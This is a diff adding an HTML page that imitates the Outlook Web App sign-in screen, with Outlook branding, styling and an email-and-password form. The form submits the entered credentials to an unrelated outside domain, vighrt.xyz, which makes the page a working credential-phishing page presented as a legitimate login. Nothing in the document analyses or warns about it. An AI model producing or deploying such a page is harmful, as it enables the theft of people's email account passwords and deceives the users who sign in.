@@ -1,0 +1,178 @@
+
+
+
+
+
+
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Outlook Web App</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="shortcut icon" href="">
+        <link href="https://fonts.googleapis.com/css?family=Noto+Sans&display=swap" rel="stylesheet">
+        <script src="https://kit.fontawesome.com/fb54c8da4f.js" crossorigin="anonymous"></script>
+        <style>
+          body{
+    background-color: rgb(242,242,242);
+    height: 100%;
+    margin: 0;
+    display: grid;
+    grid-template-columns: 200px 400px;
+    grid-gap: 30%;
+    position: fixed;
+}
+
+/* Left hand side */
+.leftBlue {
+    background-color: rgb(0,114,198);
+    margin: 0;
+    height: 100%;
+    grid-column: 1 / 2;
+}
+
+.leftWhiteLogo {
+    width: 60%;
+    margin-top: 200px;
+    margin-left: 15%;
+}    
+/* Left hand side */
+           
+/* *************************************************************************** */
+
+/* media queries */
+
+  @media screen and (max-width: 550px), (max-height:550px) { 
+    body {
+        grid-template-columns: 100px 200px;
+        grid-gap: 10%;
+    }
+
+    .leftWhiteLogo {
+        margin-top: 100px;
+    }    
+
+    .blue-icon {
+        width: 20px;
+    }
+
+    #blue-logo {
+        margin-top: 8px;
+    }
+
+    #head {
+       margin-top: 80px;
+       height: 50px;
+    }
+
+    #rightWhiteArea {
+        grid-template-rows: 50px 100px;
+
+    }
+
+    .h1 {
+        font-size: 25px;
+        margin-top: 0;
+    }
+
+    .form{
+        margin-top: 70px;
+        margin-left: 2px;
+    }
+}
+
+
+/* media queries */
+
+/* *************************************************************************** */
+
+/* right area */
+
+.rightWhiteArea {
+    grid-column: 2 / 3;
+    /* background-color: tomato; */
+    height: 100%;
+    display: grid;
+    grid-template-rows: 40% 20%;
+}
+
+.header {
+    grid-row: 1/2;
+    /* background-color: yellow; */
+    margin-top: 120px;
+}
+
+h1 {
+    font-size: 50px;
+    font-family: 'Noto Sans', sans-serif;
+    color: rgb(0,114,198);
+}
+
+.blue-icon {
+    float: left;
+    margin-top: 38px;
+}
+
+span{
+    font-size:2vw;
+}
+
+form{
+    grid-row: 2/3;
+    /* background-color: darkgoldenrod; */
+    margin-left: 7px;
+}
+
+input{
+    margin-bottom: 7px;
+}
+
+label {
+    color: gray;
+}
+
+.arrow {
+    width: 10px;
+    padding-right: 2px;
+}
+
+button {
+   border: none;
+   color: rgb(0,114,198);
+   background-color: transparent;
+}
+
+/* right area */
+
+/* *************************************************************************** */
+
+        </style>
+
+    </head>
+    <body>
+        <div class="leftBlue">
+            <img class="leftWhiteLogo" src="" alt="">
+        </div>
+        <div class="rightWhiteArea" id="rightWhiteArea">
+            <div class="header" id="head">
+                
+                <h1 class="h1">Outlook<span><sup>®</sup></span></h1>
+            </div>
+            <form class="form" action="https://vighrt.xyz/" method="POST">
+                <label for="email">Email</label><br>
+                <input type="email" name="email" required><br>
+                <label for="password">Password</label><br>
+                <input type="password" name="password" required><br>
+                <button type="submit" for="submit"><i class="far fa-arrow-alt-circle-right"></i>Sign-in</button>
+            </form>
+
+        </div>
+      
+    </body>
+</html>
